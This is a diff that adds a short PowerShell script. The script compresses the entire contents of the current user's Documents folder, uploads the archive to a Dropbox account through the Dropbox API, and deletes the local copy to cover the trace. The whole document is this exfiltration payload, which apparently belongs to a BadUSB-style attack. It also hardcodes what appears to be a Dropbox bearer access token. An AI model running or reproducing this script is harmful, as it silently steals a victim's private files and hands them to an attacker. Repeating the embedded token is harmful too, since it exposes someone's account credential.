@@ -1,0 +1,11 @@
+Compress-Archive -Path $env:USERPROFILE\Documents\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
+$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
+$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + "sl.u.AFgq-N5hzRbJm7R0EVSo2biLua2RKEvcdjnwtdPtxVIfxwBQVUUUbV_-Edgx7Xdb6a5wqkPCz8noShx6T65RetAcLtONis_pJlFK_4p62z1OlaFWMDjGS6XbEMgCY6JZZn8Z-VE3u9hEqRA4FRcFodJVsORCkaVXTqT7JJOP9ov3f0Awqs_Lg8WJ8gBm_BgEYXlu34hXfdtH_W3wwJ2MxqCZPwycFOwYnPs0DWY03eNl-VrH9WDLj9m_0c92hBL08P1_wTHKwsCCIc3Iht1Zk6yJkL39huNN8UX6cgs24LCLHSyPkzVeL0g5FpVZpI3iTDsW_NPi6yyI4IeYdValX3LmCq9U34VPew5UD1eS0qhA01nxROHFYVkUWwv6DhsfGnAs_v90mIY-2sbEivJDOqaX9EIDtFoLGJV25obNk3tA3wdt9pZT0Pn0WlQ-hBHGuseCopLeu6JKlgyjg6pisow6JkNLvhVQYLXRTubmEFMnW5MBD_DtA6dU4Nuqp6zrFjWszU1M5IHllqGUpPhsnnqNHpOSWXzHMOZvETOoot1bh-1OjODI9S9BRaENesGteWPRAip9YX18NJeUaHRwjMnoiGk049zsNb4yD5Mr9xC5gsf8sxuXsKBxZYl8pLUW37BXCYhdeInfz1eK5vyZclYQz-CBqceQeHi08ulaCr5qHBn1oaGJpfI74t2e5wc1E70SLaRLDRiaRodD09p1mfh5v_UG4CHzJSVvMPzT-GkASPQX2E8kC5PIQf5cPSn6Lx5c5fvpDcN-4cGHY3WylIpJrjEOchqmB_0EHL6PlLMuKu7--FiseuJWJeghBSIU05KKTzeS8_5GwdjaDyp70cKVdASOvv3v9-kvjHajy36HUfIWEZF5gp5hx50CGyBY1KWgHZBwLqzwVtt_UXJlieCiKHZPDBu331n4a-PYQXowXoJ9st5oaQ2PCSdxtv4ZLWFrqx7D6LvBfSQk4ot12nG6XWGA3iDvAEgjSJOWZ7YGJxsaZoXnlczpwsNq7t-iMAum_gUwb6q8JqJwBRudSCGOuzCYcqbwZKyu-pgO620JGy-npf5_QbqHIYNTzBiwBYuTgztd3mI2RxB1p_63_f8L9wIN-mQ_BCBukdSA-vRLWxc8seaW8b6GStuW5wKyk5171M3CSWLNmEvKpxKbW6W0LINhbrBq_72YgPjanzW-0qZAQYPf4KJO1W8UcdONrdRFtq4m3mxOzLI3w2vHr7_zefAxLoSo4fSUJsWsHAguAuoHJQxhEY58Qt7qnbfGuwNUg6w2CPIF0iOxSOVslbzrNXPv_UUvp-BL52RiIOGHW1CJdzsuX-rnTi9rV2CTMxekBdYw41SmzrNqzKLPcRzTwTnXAk5rZI59QygktoOVPKD_a7boa7MPP1T1HKLRt8voiGao-pfQlGbTeuOUpPls"
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+rm $SourceFilePath
